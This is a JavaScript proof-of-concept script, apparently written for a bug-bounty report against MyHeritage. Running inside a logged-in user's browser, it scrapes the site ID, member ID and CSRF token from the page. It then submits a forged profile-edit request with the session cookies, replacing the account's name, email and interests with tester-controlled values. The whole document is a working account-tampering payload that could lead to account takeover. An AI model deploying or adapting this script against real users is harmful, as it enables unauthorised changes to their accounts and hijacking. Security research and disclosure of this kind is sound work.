// MyHeritage Profile Auto-Editor
(async () => {
    console.log('[AutoEdit] Starting profile auto-edit...');

    // Step 1: Extract site ID (s parameter) from current URL
    const urlParams = new URLSearchParams(window.location.search);
    let siteID = urlParams.get('s');
    
    // If not in URL params, try to extract from pathname
    if (!siteID) {
        const pathMatch = window.location.pathname.match(/\/family-sites\/[^\/]+\/([A-Z0-9]+)/);
        if (pathMatch) {
            siteID = pathMatch[1];
        }
    }

    if (!siteID) {
        console.error('[AutoEdit] Could not find site ID (s parameter)');
        return;
    }
    console.log('[AutoEdit] Site ID:', siteID);

    // Step 2: Extract memberID from page source
    let memberID = null;
    
    // Try to find in global variable
    if (typeof currentUserAccountID !== 'undefined') {
        memberID = currentUserAccountID;
    } else {
        // Parse from page source
        const bodyText = document.body.innerHTML;
        const memberIDMatch = bodyText.match(/var currentUserAccountID\s*=\s*["']([A-Z0-9]+)["']/);
        if (memberIDMatch) {
            memberID = memberIDMatch[1];
        }
    }

    if (!memberID) {
        console.error('[AutoEdit] Could not find member ID');
        return;
    }
    console.log('[AutoEdit] Member ID:', memberID);

    // Step 3: Fetch the edit profile page to get CSRF token
    const editProfileURL = `https://www.myheritage.com/FP/memberEditProfile.php?s=${siteID}&memberID=${memberID}`;
    console.log('[AutoEdit] Fetching edit profile page...');
    
    let csrfToken = null;
    try {
        const response = await fetch(editProfileURL);
        const html = await response.text();
        
        // Extract CSRF token from the page
        const csrfMatch = html.match(/csrf_token=([^&'"]+)/);
        if (csrfMatch) {
            csrfToken = csrfMatch[1];
        }
    } catch (error) {
        console.error('[AutoEdit] Error fetching edit profile page:', error);
        return;
    }

    if (!csrfToken) {
        console.error('[AutoEdit] Could not find CSRF token');
        return;
    }
    console.log('[AutoEdit] CSRF Token:', csrfToken);

    // Step 4: Prepare the POST data
    const formData = new URLSearchParams({
        memberID: memberID,
        isPostBack: '1',
        origin: 'member',
        s: siteID,
        gender: 'M',
        firstName: 'Testing',
        lastName: 'JS',
        month: '00',
        day: '0',
        year: '1950',
        country: 'MA',
        state: '',
        province: '',
        zipCode: '',
        preferredLang: 'EN',
        interests: 'naysser+hacked@bugcrowdninja.com',
        oldPassword: '',
        newPassword: '',
        confirmNewPassword: '',
        isChangePasswordOpen: '0',
        email: 'naysser+1@bugcrowdninja.com',
        currentPassword: '',
        isChangeEmailOpen: '0',
        deleteAccountConfirmationPassword: '',
        csrf_token: csrfToken
    });

    // Step 5: Submit the POST request
    console.log('[AutoEdit] Submitting profile changes...');
    try {
        const postResponse = await fetch(`${editProfileURL}&sourceList=`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData.toString(),
            credentials: 'include' // Important: include cookies
        });

        if (postResponse.ok) {
            console.log('[AutoEdit] Profile updated successfully!');
            alert('Profile has been automatically updated!');
            // Optionally reload the page to see changes
            // window.location.reload();
        } else {
            console.error('[AutoEdit] Failed to update profile. Status:', postResponse.status);
        }
    } catch (error) {
        console.error('[AutoEdit] Error submitting profile changes:', error);
    }
})();
